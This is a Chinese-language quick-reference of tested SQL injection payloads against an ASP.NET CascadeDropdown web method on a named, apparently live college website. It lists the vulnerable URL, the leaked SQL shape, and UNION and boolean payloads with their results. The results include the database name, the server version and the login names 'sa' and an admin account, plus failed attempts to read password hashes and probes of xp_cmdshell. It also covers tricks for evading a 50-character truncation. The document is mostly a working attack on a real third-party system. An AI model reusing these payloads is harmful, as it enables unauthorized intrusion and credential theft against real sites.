# CascadeDropdown 值注入实测 payload 速查（usc_rec acecollege.in, SQL Server 2019 CU32）

端点（GET，走 http 代理）：
`http://acecollege.in/WebMethod/CascadeDropdown.asmx/GetCourse?knownCategoryValues=CourseTypeId:{payload}`

返回 `<name>`/`<value>` 对；500 返回 SQL 报错 = oracle。

## SQL 形状（报错泄露）

`SELECT CourseId, CourseName FROM M_Course WHERE CourseTypeId = '{FilterValue}' order by CourseName`

UNION 需 2 列（第一列→value=CourseId int，第二列→name=CourseName nvarchar）。

## 实测成功/失败矩阵

| payload | 结果 |
|---|---|
| `CourseTypeId:1` | 200 课程列表 |
| `CourseTypeId:1'` | 500 Unclosed quotation mark（确认值注入点）|
| `CourseTypeId:1' OR '1'='1` | 200 全表（布尔注入生效）|
| `CourseTypeId:1' UNION SELECT 1, DB_NAME()--` | 200 返回 `DB_A6B40D_Ace`（函数可执行）|
| `CourseTypeId:1' UNION SELECT 1, @@VERSION--` | 200 SQL Server 2019 (RTM-CU32) 15.0.4430.1 Web Edition / Win Server 2022 |
| `CourseTypeId:1' UNION SELECT 1, name FROM sys.sql_logins--` | 200 `sa`/`DB_A6B40D_Ace_admin` |
| `CourseTypeId:1' UNION SELECT 1, sid FROM sys.sql_logins--` | 200 二进制乱码（varbinary 原始值）|
| `CourseTypeId:1' UNION SELECT 1, password_hash FROM sys.sql_logins--` | 500 截断（51 字符超 varchar(50)）|
| `CourseTypeId:' UNION SELECT 1,password_hash FROM sys.sql_logins--` | 500 截断（51 字符）|
| `CourseTypeId:1' UNION SELECT 1, password_hash FROM syslogins--` | 500 Invalid column name 'password_hash'（syslogins 无此列）|

## 截断 oracle（定位 varchar(N)）

- 49 字符成功 / 52 字符失败 → @FilterValue = varchar(50)
- 截断吃掉 `--` 的第二个 `-`，报 `Incorrect syntax near '-'` + `Unclosed quotation mark after '  order by CourseName'`

## 省字符技巧

- `1'` → `'`（`''` 空串闭合，省 1）
- `' UNION` → `'UNION`（省 1 空格；`''UNION` token 边界合法）

## varbinary → hex 的三种方式

1. `CONVERT(varchar(200), col, 1)` — 需类型括号，CascadeDropdown 里 payload 超截断，AutoComplete 子查询里 CONVERT+FROM 报 `near 'F'`
2. `CAST(col AS varchar(200))` — 同 CONVERT，类型括号问题
3. `sys.fn_varbintohexstr(col)` — 最简单但**必须带 `sys.` 前缀**（不带报 `'fn_varbintohexstr' is not a recognized function name`），且 AutoComplete 子查询里带 `sys.` 点号触发 `near '%%'`

## password_hash 权限墙（关键结论）

- 租户 db_owner 读 `sys.sql_logins.password_hash` = **空数组（NULL）**，`sid` = `System.Byte[]`，`name`/`is_disabled`/`type_desc` 正常
- 原因：password_hash 需 CONTROL SERVER（server 级），db_owner 是库级，不够
- `is_disabled=False` + `type_desc=SQL_LOGIN` 证明 sa 存在且启用，但哈希被权限模型挡死
- xp_cmdshell 同理默认要 sysadmin；配置项 `sys.configurations` name 存在（prefix=xp_cmdshell 可读到），但 `value_in_use`（int 列）AutoComplete 直接读报 500（int 不能 LIKE）

## AutoComplete contextKey 与 CascadeDropdown 的约束对比

| 注入面 | 形态 | 能执行 | 硬约束 |
|---|---|---|---|
| AutoComplete contextKey | 表名/列名注入 | 本地子查询含函数（CONVERT/DB_NAME/@@VERSION）| 四段式/WHERE/CONVERT+FROM 挂 |
| CascadeDropdown knownCategoryValues | 值注入（单引号闭合）| UNION + 函数 + 四段式 + 任意表 | @FilterValue varchar(50) 截断 |

函数"墙"是误判——真正挂的是存储过程对四段式/WHERE/类型转换组合的拼接处理。
